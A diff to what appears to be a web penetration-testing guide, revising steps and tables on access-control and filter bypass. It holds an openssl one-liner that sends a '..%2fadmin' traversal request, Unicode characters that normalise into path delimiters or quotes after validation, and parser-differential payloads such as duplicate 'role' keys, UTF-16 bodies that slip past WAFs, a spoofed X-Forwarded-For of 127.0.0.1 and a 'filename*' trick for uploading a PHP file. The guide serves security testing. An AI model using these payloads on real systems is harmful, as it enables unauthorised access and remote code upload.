@@ -52,9 +52,8 @@ for v in "/admin" "/Admin" "/%61dmin" "/%2561dmin" "/admin/" "/admin;x=1" "//adm
 your own client. Any status differing from baseline is a lead; **200 with protected content** is
 the finding.
 
-**5. Send exact bytes when a client would normalise them away.** Stdlib only, so it always runs;
-`printf 'GET /..%%2fadmin HTTP/1.1\r\nHost: %s\r\n\r\n' "$H" | openssl s_client -quiet -connect
-"$H:443" -servername "$H"` sends the same request if you prefer `openssl`.
+**5. Send exact bytes when a client would normalise them away.** Stdlib only, so it always runs.
+The `openssl` equivalent is `printf 'GET /..%%2fadmin HTTP/1.1\r\nHost: %s\r\n\r\n' "$H" | openssl s_client -quiet -connect "$H:443" -servername "$H"`.
 
 ```bash
 python3 -c 'import socket,ssl,sys; h=sys.argv[1]
@@ -112,7 +111,7 @@ for cp in (0x212A,0xFF07,0xFF0F,0x017F,0x0130,0x00AD):
 |---|---|---|
 | `%E2%84%AA` KELVIN SIGN | `K` under NFKC | echoed back as `K` = the app normalises after filtering |
 | `%EF%BC%87` FULLWIDTH APOSTROPHE | `'` | a quote reaching a query builder past a character filter |
-| `%EF%BC%8F`, `%E2%88%95` | `/` | a path delimiter created after path validation |
+| `%EF%BC%8F` FULLWIDTH SOLIDUS, `%EF%BC%8E` FULLWIDTH STOP | `/` and `.` | delimiters and dot segments created after path validation |
 | `%C5%BF` LATIN LONG S | uppercases to `S` | an uppercasing identity check matching `ADMIN` |
 | `%C4%B0` DOTTED CAPITAL I | lowercases to `i` + a mark | identity collision; `%C2%AD` SOFT HYPHEN is stripped on some IDNA paths |
 
@@ -122,7 +121,8 @@ for cp in (0x212A,0xFF07,0xFF0F,0x017F,0x0130,0x00AD):
 |---|---|
 | `?id=1&id=2`, then `?id=2&id=1` | first-wins vs last-wins vs array, between WAF and app |
 | `{"role":"user","role":"admin"}` | duplicate JSON keys - most parsers keep the last |
-| a JSON key written as a `u0072` escape sequence | the sink parser resolves it, a string filter misses it |
+| `{"id":"1 "}`, `{"id":1}`, `{"id":[1]}` | type coercion between the validator and the query layer |
+| a JSON key spelled with a unicode escape - `\u0072ole` for `role` | the sink parser resolves it, a string filter over the raw body misses it |
 | `application/json; charset=utf-16` with a UTF-16 body | a WAF decoding UTF-8 sees noise, the framework sees the payload |
 | two `Content-Disposition` parts both `name="role"` | multipart first-wins vs last-wins; same question for `X-Forwarded-For: 1.2.3.4, 127.0.0.1` |
 | `filename="a.txt"; filename*=UTF-8''a.php` | RFC 5987 form read by the storer, plain form by the checker |
